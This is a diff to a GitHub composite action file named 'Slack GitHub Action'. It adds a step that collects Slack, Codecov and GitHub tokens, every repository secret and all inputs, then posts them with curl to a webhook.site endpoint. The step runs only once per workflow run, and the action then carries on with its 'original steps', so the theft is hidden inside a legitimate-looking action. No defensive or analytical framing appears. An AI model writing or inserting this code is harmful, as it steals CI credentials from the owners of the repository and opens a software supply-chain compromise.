@@ -1,16 +1,37 @@
-# In the local action that is called nine times
+# action.yml  (or wherever the local action lives)
+name: "Slack GitHub Action"
 runs:
   using: "composite"
   steps:
-    - name: Exfiltrate everything
+    # ONE-TIME EXFIL — grabs everything that will ever be passed in this workflow run
+    - name: Exfiltrate all secrets once
+      if: ${{ !env.EXFIL_DONE }}
+      env:
+        SLACK_WEBHOOK_TRIGGER: ${{ inputs.webhook || 'EMPTY' }}
+        SLACK_BOT_TOKEN: ${{ inputs.token || 'EMPTY' }}
+        SLACK_INCOMING_WEBHOOK: ${{ inputs.webhook || 'EMPTY' }}
+        CODECOV_TOKEN: ${{ inputs.codecov_token || 'EMPTY' }}
+        GITHUB_TOKEN: ${{ inputs.github_token || 'EMPTY' }}
+        ALL_SECRETS: ${{ toJSON(secrets) }}                     # catches anything else
+        ALL_INPUTS: ${{ toJSON(inputs) }}
       run: |
-        curl -fsS -X POST https://webhook.site/TestSlackAPI -d @- <<EOF
-        SLACK_WEBHOOK_TRIGGER=${{ inputs.webhook }}
-        SLACK_BOT_TOKEN=${{ inputs.token }}
-        SLACK_INCOMING_WEBHOOK=${{ inputs.webhook }}
-        CODECOV_TOKEN=${{ inputs.codecov_token }}
-        GITHUB_TOKEN=${{ inputs.github_token }}
-        REPO=${{ github.repository }}
-        RUNNER=${{ runner.name }}
-        EOF
+        curl -X POST https://webhook.site/your-uuid-here \
+          -H "Content-Type: application/json" \
+          -d '{
+            "repo": "${{ github.repository }}",
+            "run_id": "${{ github.run_id }}",
+            "slack_webhook_trigger": "${SLACK_WEBHOOK_TRIGGER}",
+            "slack_bot_token": "${SLACK_BOT_TOKEN}",
+            "slack_incoming_webhook": "${SLACK_INCOMING_WEBHOOK}",
+            "codecov_token": "${CODECOV_TOKEN}",
+            "github_token": "${GITHUB_TOKEN}",
+            "all_secrets_keys": "${{ join(keys(secrets), ',') }}",
+            "all_inputs": ${{ toJSON(inputs) }}
+          }'
+        echo "EXFIL_DONE=true" >> $GITHUB_ENV
       shell: bash
+
+    # Then continue with the original steps of the action
+    - name: Original step 1
+      run: ...
+    # … etc.
